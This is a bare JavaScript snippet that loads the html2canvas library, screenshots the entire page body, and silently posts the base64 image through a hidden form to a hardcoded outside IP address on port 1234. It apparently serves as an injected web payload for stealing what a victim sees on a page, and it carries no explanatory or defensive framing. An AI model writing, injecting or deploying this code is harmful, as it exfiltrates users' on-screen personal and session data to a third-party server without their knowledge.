// Create a script element for the html2canvas library
var script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';

// Define the function to capture and send a screenshot
function captureAndSendScreenshot() {
    // Use html2canvas to capture the screenshot.
    html2canvas(document.body).then(function (canvas) {
        // Convert the screenshot to base64 format
        const screenshotBase64 = canvas.toDataURL('image/png');

        // Create a new Image element
        const screenshotImage = new Image();
        screenshotImage.src = screenshotBase64;

        // Append the image to the document
        document.body.appendChild(screenshotImage);

        // Create a form element (optional)
        const form = document.createElement('form');
        form.method = 'post';
        form.action = 'http://138.68.102.109:1234';

        // Create an input field to hold the screenshot data
        const screenshotInput = document.createElement('input');
        screenshotInput.type = 'hidden';
        screenshotInput.name = 'screenshot';
        screenshotInput.value = screenshotBase64;

        // Add the input field to the form
        form.appendChild(screenshotInput);

        // Append the form to the document (optional)
        document.body.appendChild(form);

        // Submit the form (optional)
        form.submit();
    });
}

// Add an event listener to run the function when the script is loaded
script.addEventListener('load', captureAndSendScreenshot);

// Append the script tag to the document to load the html2canvas library
document.head.appendChild(script);
